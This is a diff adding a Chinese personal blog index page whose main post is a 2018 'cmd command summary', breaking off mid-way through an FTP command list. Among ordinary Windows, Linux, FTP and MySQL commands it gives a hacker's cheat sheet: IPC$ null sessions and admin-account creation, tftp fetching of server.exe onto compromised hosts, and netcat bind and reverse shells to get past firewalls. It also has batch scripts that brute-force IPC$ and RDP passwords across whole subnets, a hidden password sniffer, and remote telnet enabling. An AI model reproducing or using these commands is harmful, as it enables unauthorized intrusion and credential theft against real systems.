@@ -202,6 +202,295 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-web安全-认证和授权类-认证和授权类测试" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/12/27/web安全-认证和授权类-认证和授权类测试/" class="article-date">
+  	<time datetime="2018-12-26T22:47:35.000Z" itemprop="datePublished">2018-12-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/27/web安全-认证和授权类-认证和授权类测试/">
+        web安全##认证和授权类#认证和授权类测试
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <img src="/2018/12/27/web安全-认证和授权类-认证和授权类测试/1.jpg">
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/websec/">Web安全</a>
+	</div>
+
+
+      
+        
+<div class="counter-tag counter">
+    <span id="/2018/12/27/web安全-认证和授权类-认证和授权类测试/" class="leancloud_visitors post-title-link"
+          style="font-size: 12px" data-flag-title="web安全##认证和授权类#认证和授权类测试">
+         &nbsp;
+        view
+    </span>
+</div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-命令-cmd命令总结" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/12/27/命令-cmd命令总结/" class="article-date">
+  	<time datetime="2018-12-26T22:29:50.000Z" itemprop="datePublished">2018-12-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/27/命令-cmd命令总结/">
+        命令#cmd命令总结
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>一：<br>net use \ip\ipc$ “ “ /user:” “ 建立IPC空链接<br>net use \ip\ipc$ “密码” /user:”用户名” 建立IPC非空链接<br>net use h: \ip\c$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:<br>net use h: \ip\c$ 登陆后映射对方C：到本地为H:<br>net use \ip\ipc$ /del 删除IPC链接<br>net use h: /del 删除映射对方到本地的为H:的映射<br>net user 用户名　密码　/add 建立用户<br>net user guest /active:yes 激活guest用户<br>net user 查看有哪些用户<br>net user 帐户名 查看帐户的属性<br>net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数<br>net start 查看开启了哪些服务<br>net start 服务名　 开启服务；(如:net start telnet， net start schedule)<br>net stop 服务名 停止某服务<br>net time \目标ip 查看对方时间<br>net time \目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息<br>net view 查看本地局域网内开启了哪些共享<br>net view \ip 查看对方局域网内开启了哪些共享<br>net config 显示系统网络设置<br>net logoff 断开连接的共享<br>net pause 服务名 暂停某服务<br>net send ip “文本信息” 向对方发信息<br>net ver 局域网内正在使用的网络连接类型和信息<br>net share 查看本地开启的共享<br>net share ipc$ 开启ipc$共享<br>net share ipc$ /del 删除ipc$共享<br>net share c$ /del 删除C：共享<br>net user guest 12345 用guest用户登陆后用将密码改为12345<br>net password 密码 更改系统登陆密码<br>netstat -a 查看开启了哪些端口,常用netstat -an<br>netstat -n 查看端口的网络连接情况，常用netstat -an<br>netstat -v 查看正在进行的工作<br>netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）<br>netstat -s 查看正在使用的所有协议使用情况<br>nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写<br>tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。<br>ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。<br>ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)<br>ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息<br>tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)<br>kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)<br>del -F 文件名加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR <em>.</em>”表示删除当前目录下所有只读文件，“DEL/A-S <em>.</em>”表示删除当前目录下除系统文件以外的所有文件。</p>
+<p>二：<br>del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）<br>move 盘符\路径\要移动的文件名　存放移动文件的路径\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令<br>at id号 开启已注册的某个计划任务<br>at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止<br>at id号 /delete 停止某个已注册的计划任务<br>at 查看所有的计划任务<br>at \ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机<br>finger username @host 查看最近有哪些用户登陆<br>telnet ip 端口 远和登陆服务器,默认端口为23<br>open ip 连接到IP（属telnet登陆后的命令）<br>telnet 在本机上直接键入telnet 将进入本机的telnet<br>copy 路径\文件名1　路径\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件<br>copy c:\srv.exe \ip\admin$ 复制本地c:\srv.exe到对方的admin下<br>cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件<br>copy \ip\admin$\svv.exe c:\ 或:copy\ip\admin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：<br>xcopy 要复制的文件或目录树　目标地址\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件<br>tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\server.exe 登陆后，将“IP”的server.exe下载到目标主机c:\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送<br>tftp -i 对方IP　put c:\server.exe 登陆后，上传本地c:\server.exe至主机<br>ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)<br>route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface<br>arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息<br>start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令<br>mem 查看cpu使用情况<br>attrib 文件名(目录名) 查看某文件（目录）的属性<br>attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性<br>dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间<br>date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间<br>set 指定环境变量名称=要指派给变量的字符 设置环境变量<br>set 显示当前所有的环境变量<br>set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量<br>pause 暂停批处理程序，并显示出：请按任意键继续….<br>if 在批处理程序中执行条件处理（更多说明见if命令及变量）<br>goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）<br>call 路径\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）<br>for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）<br>echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置<br>echo 信息 在屏幕上显示出信息<br>echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中<br>findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello<br>find 文件名 查找某文件<br>title 标题名字 更改CMD窗口标题名字<br>color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白<br>prompt 名称 更改cmd.exe的显示的命令提示符(把C:\、D:\统一改为：EntSky\ )</p>
+<p>三：<br>ver 在DOS窗口下显示版本信息<br>winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）<br>format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS<br>md　目录名 创建目录<br>replace 源文件　要替换文件的目录 替换文件<br>ren 原文件名　新文件名 重命名文件名<br>tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称<br>type 文件名 显示文本文件的内容<br>more 文件名 逐屏显示输出文件<br>doskey 要锁定的命令＝字符<br>doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=<br>taskmgr 调出任务管理器<br>chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误<br>tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口<br>exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe<br>path 路径\可执行文件的文件名 为可执行文件设置一个路径。<br>cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?<br>regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；<br>regedit /e 注册表文件名 导出注册表<br>cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\test.txt /D pub 设定d:\test.txt拒绝pub用户访问。<br>cacls 文件名 查看文件的访问用户权限列表<br>REM 文本内容 在批处理文件中添加注解<br>netsh 查看或更改本地网络配置情况</p>
+<p>四：<br>IIS服务命令：<br>iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）<br>iisreset /start或stop 启动（停止）所有Internet服务<br>iisreset /restart 停止然后重新启动所有Internet服务<br>iisreset /status 显示所有Internet服务状态<br>iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动<br>iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机<br>iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务<br>iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。<br>FTP 命令： (后面有详细说明内容)<br>ftp的命令行格式为:<br>ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。<br>－d 使用调试方式。<br>－n 限制ftp的自动登录,即不使用.netrc文件。<br>－g 取消全局文件名。<br>help [命令] 或 ？[命令] 查看命令说明<br>bye 或 quit 终止主机FTP进程,并退出FTP管理方式.<br>pwd 列出当前远端主机目录<br>put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中<br>get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中<br>mget [remote-files] 从远端主机接收一批文件至本地主机<br>mput local-files 将本地主机中一批文件传送至远端主机<br>dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件<br>ascii 设定以ASCII方式传送文件(缺省值)<br>bin 或 image 设定以二进制方式传送文件<br>bell 每完成一次文件传送,报警提示<br>cdup 返回上一级目录<br>close 中断与远程服务器的ftp会话(与open对应)<br>open host[port] 建立指定ftp服务器连接,可指定连接端口<br>delete 删除远端主机中的文件<br>mdelete [remote-files] 删除一批文件<br>mkdir directory-name 在远端主机中建立目录<br>rename [from] [to] 改变远端主机中的文件名<br>rmdir directory-name 删除远端主机中的目录<br>status 显示当前FTP的状态<br>system 显示远端主机系统类型<br>user user-name [password] [account] 重新以别的用户名登录远端主机<br>open host [port] 重新建立一个新的连接<br>prompt 交互提示模式<br>macdef 定义宏命令<br>lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录<br>chmod 改变远端主机的文件权限<br>case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母<br>cd remote－dir 进入远程主机目录<br>cdup 进入远程主机目录的父目录<br>! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip</p>
+<p>五：<br>MYSQL 命令：<br>mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。<br>（例：mysql -h110.110.110.110 -Uroot -P123456<br>注:u与root可以不用加空格，其它也一样）<br>exit 退出MYSQL<br>mysqladmin -u用户名 -p旧密码 password 新密码 修改密码<br>grant select on 数据库.<em> to 用户名@登录主机 identified by \”密码\”; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）<br>show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。<br>use mysql；<br>show tables; 显示库中的数据表<br>describe 表名; 显示数据表的结构<br>create database 库名; 建库<br>use 库名；<br>create table 表名 (字段设定列表)； 建表<br>drop database 库名;<br>drop table 表名； 删库和删表<br>delete from 表名; 将表中记录清空<br>select </em> from 表名; 显示表中的记录<br>mysqldump –opt school&gt;school.bbb 备份数据库：（命令在DOS的\mysql\bin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb 是一个文本文件，文件名任取，打开看看你会有新发现。<br>win2003系统下新增命令（实用部份）：<br>shutdown /参数 关闭或重启本地或远程主机。<br>参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。<br>例：shutdown /r /t 0 立即重启本地主机（无延时）<br>taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。<br>参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。<br>tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。<br>参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。</p>
+<p>六：<br>Linux系统下基本命令： 要区分大小写<br>uname 显示版本信息（同win2K的 ver）<br>dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）<br>pwd 查询当前所在的目录位置<br>cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。<br>cat 文件名 查看文件内容<br>cat &gt;abc.txt 往abc.txt文件中写上内容。<br>more 文件名 以一页一页的方式显示一个文本文件。<br>cp 复制文件<br>mv 移动文件<br>rm 文件名 删除文件，rm -a 目录名删除目录及子目录<br>mkdir 目录名 建立目录<br>rmdir 删除子目录，目录内没有文档。<br>chmod 设定档案或目录的存取权限<br>grep 在档案中查找字符串<br>diff 档案文件比较<br>find 档案搜寻<br>date 现在的日期、时间<br>who 查询目前和你使用同一台机器的人以及Login时间地点<br>w 查询目前上机者的详细资料<br>whoami 查看自己的帐号名称<br>groups 查看某人的Group<br>passwd 更改密码<br>history 查看自己下过的命令<br>ps 显示进程状态<br>kill 停止某进程<br>gcc 黑客通常用它来编译C语言写的文件<br>su 权限转换为指定使用者<br>telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。<br>ftp ftp连接上某服务器（同win2K）<br>附：批处理命令与变量<br>1：for命令及变量 基本格式：<br>FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。<br>批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use \ip\ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3<br>(set):指定一个或一组文件，可使用通配符，如：(D:\user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个”1”指起始值，第二个”1”指增长量，第三个”254”指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 }<br>command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开<br>command_parameters：为特定命令指定参数或命令行开关<br>IN (set)：指在(set)中取值；DO command ：指执行command<br>参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:\pass.txt)时 }。<br>用法举例：<br>@echo off<br>echo 用法格式：test.bat <em>.</em>.<em> &gt; test.txt<br>for /L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use \%1.%%G /user:administrator | find “命令成功完成” &gt;&gt;test.txt<br>存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。<br>/L 指用增量形式（即从1-254或254-1）；输入的IP前面三位：</em>.<em>.</em>为批处理默认的 %1；%%G 为变量(ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有”命令成功完成”信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。<br>@echo off<br>echo 用法格式：ok.bat ip<br>FOR /F %%i IN (D:\user.dic) DO smb.exe %1 %%i D:\pass.dic 200<br>存为：ok.exe 说明：输入一个IP后，用字典文件d:\pass.dic来暴解d:\user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。<br>七：<br>2：if命令及变量 基本格式：<br>IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。<br>例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。<br>0 指发现并成功执行（真）；1 指没有发现、没执行（假）。<br>IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。<br>例：“if “%2%”==”4” goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加” “）<br>IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。<br>例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到”:end”标签处。<br>IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。当有del命令时需把del命令全部内容用&lt; &gt;括起来，因为del命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：“if exist test.txt. <del test.txt.=""> else echo test.txt.missing ”，注意命令中的“.”<br>（二）系统外部命令(均需下载相关工具)：<br>1、瑞士军刀：nc.exe<br>参数说明：<br>-h 查看帮助信息<br>-d 后台模式<br>-e prog程序重定向，一但连接就执行［危险］<br>-i secs延时的间隔<br>-l 监听模式，用于入站连接<br>-L 监听模式，连接天闭后仍然继续监听，直到CTR+C<br>-n IP地址，不能用域名<br>-o film记录16进制的传输<br>-p[空格]端口 本地端口号<br>-r 随机本地及远程端口<br>-t 使用Telnet交互方式<br>-u UDP模式<br>-v 详细输出，用-vv将更详细<br>-w数字 timeout延时间隔<br>-z 将输入，输出关掉（用于扫锚时）<br>基本用法：<br>nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口<br>nc -l -p 80 开启本机的TCP 80端口并监听<br>nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口<br>nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口<br>nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口<br>高级用法：<br>nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止<br>nc -L -p 80 &gt; c:\log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\log.txt<br>nc -L -p 80 &lt; c:\honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中，亦可起到传送文件作用<br>type.exe c:\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中,亦可起到传送文件作用<br>本机上用：nc -l -p 本机端口<br>在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 <em>win2K<br>nc -e /bin/sh 本机IP -p 本机端口 </em>linux,unix 反向连接突破对方主机的防火墙<br>本机上用：nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称<br>在对方主机上用：nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机<br>备 注：<br>| 管道命令<br>&lt; 或 &gt; 重定向命令。“&lt;”，例如：tlntadmn &lt; test.txt 指把test.txt的内容赋值给tlntadmn命令<br>＠ 表示执行＠后面的命令，但不会显示出来（后台执行）；例：＠dir c:\winnt &gt;&gt; d:\log.txt 意思是：后台执行dir，并把结果存在d:\log.txt中</del></p>
+<blockquote>
+<p>与&gt;&gt;的区别 　“&gt;”指：覆盖；”&gt;&gt;”指：保存到(添加到）。<br>如： @dir c:\winnt &gt;&gt; d:\log.txt和@dir c:\winnt &gt; d:\log.txt二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。<br>八：<br>2、扫锚工具：xscan.exe<br>基本格式<br>xscan -host &lt;起始IP&gt;[-&lt;终止IP&gt;] &lt;检测项目&gt; [其他选项] 扫锚”起始IP到终止IP”段的所有主机信息<br>xscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] 扫锚”主机IP列表文件名”中的所有主机信息<br>检测项目<br>-active 检测主机是否存活<br>-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）<br>-port 检测常用服务的端口状态<br>-ftp 检测FTP弱口令<br>-pub 检测FTP服务匿名用户写权限<br>-pop3 检测POP3-Server弱口令<br>-smtp 检测SMTP-Server漏洞<br>-sql 检测SQL-Server弱口令<br>-smb 检测NT-Server弱口令<br>-iis 检测IIS编码/解码漏洞<br>-cgi 检测CGI漏洞<br>-nasl 加载Nessus攻击脚本<br>-all 检测以上所有项目<br>其它选项<br>-i 适配器编号 设置网络适配器, &lt;适配器编号&gt;可通过”-l”参数获取<br>-l 显示所有网络适配器<br>-v 显示详细扫描进度<br>-p 跳过没有响应的主机<br>-o 跳过没有检测到开放端口的主机<br>-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10<br>-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)<br>用法示例<br>xscan -host 192.168.1.1-192.168.255.255 -all -active -p　 检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机<br>xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机<br>xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机<br>九：<br>3、命令行方式嗅探器: xsniff.exe<br>可捕获局域网内FTP/SMTP/POP3/HTTP协议密码<br>参数说明<br>-tcp 输出TCP数据报<br>-udp 输出UDP数据报<br>-icmp 输出ICMP数据报<br>-pass 过滤密码信息<br>-hide 后台运行<br>-host 解析主机名<br>-addr IP地址 过滤IP地址<br>-port 端口 过滤端口<br>-log 文件名 将输出保存到文件<br>-asc 以ASCII形式输出<br>-hex 以16进制形式输出<br>用法示例<br>xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中<br>xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出<br>4、终端服务密码破解: tscrack.exe<br>参数说明<br>-h 显示使用帮助<br>-v 显示版本信息<br>-s 在屏幕上打出解密能力<br>-b 密码错误时发出的声音<br>-t 同是发出多个连接（多线程）<br>-N Prevent System Log entries on targeted server<br>-U 卸载移除tscrack组件<br>-f 使用－f后面的密码<br>-F 间隔时间（频率）<br>-l 使用－l后面的用户名<br>-w 使用－w后面的密码字典<br>-p 使用－p后面的密码<br>-D 登录主页面<br>用法示例<br>tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码<br>tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户<br>@if not exist ipcscan.txt goto noscan<br>@for /f “tokens=1 delims= “ %%i in (3389.txt) do call hack.bat %%i<br>nscan<br>@echo 3389.txt no find or scan faild<br>(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)<br>3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat<br>@if not exist tscrack.exe goto noscan<br>@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt<br>:noscan<br>@echo tscrack.exe no find or scan faild<br>(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)<br>hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。<br>5、其它：<br>Shutdown.exe<br>Shutdown \IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）<br>fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）<br>fpipe -l 80 -s 1029 -r 80 <a href="http://www.sina.com.cn" target="_blank" rel="noopener">www.sina.com.cn</a> 当有人扫锚你的80端口时，他扫到的结果会完全是<a href="http://www.sina.com.cn的主机信息" target="_blank" rel="noopener">www.sina.com.cn的主机信息</a><br>Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的 88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。<br>OpenTelnet.exe (远程开启telnet工具)<br>opentelnet.exe \IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet \ip 连接上对方。<br>NTLM认证方式：０：不使用NTLM身份验证；１：先尝试NTLM身份验证，如果失败，再使用用户名和密码；２：只使用NTLM身份验证。<br>ResumeTelnet.exe (OpenTelnet附带的另一个工具)<br>resumetelnet.exe \IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。<br>十：<br>6、FTP命令详解：<br>FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。<br>FTP的命令行格式为：<br>ftp -v -d -i -n -g [主机名] ，其中<br>-v 显示远程服务器的所有响应信息；<br>-n 限制ftp的自动登录，即不使用；.n etrc文件；<br>-d 使用调试方式；<br>-g 取消全局文件名。<br>FTP使用的内部命令如下(中括号表示可选项):<br>1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls<em>.zip<br>2.$ macro-ame[args]： 执行宏定义macro-name。<br>3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。<br>4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。<br>5.ascii：使用ascii类型传输方式。<br>6.bell：每个命令执行完毕后计算机响铃一次。<br>7.bin：使用二进制文件传输方式。<br>8.bye：退出ftp会话过程。<br>9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。<br>10.cd remote-dir：进入远程主机目录。<br>11.cdup：进入远程主机目录的父目录。<br>12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。<br>13.close：中断与远程服务器的ftp会话(与open对应)。<br>14.cr：使用asscii方式传输文件时，将回车换行转换为回行。<br>15.delete remote-file：删除远程主机文件。<br>16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 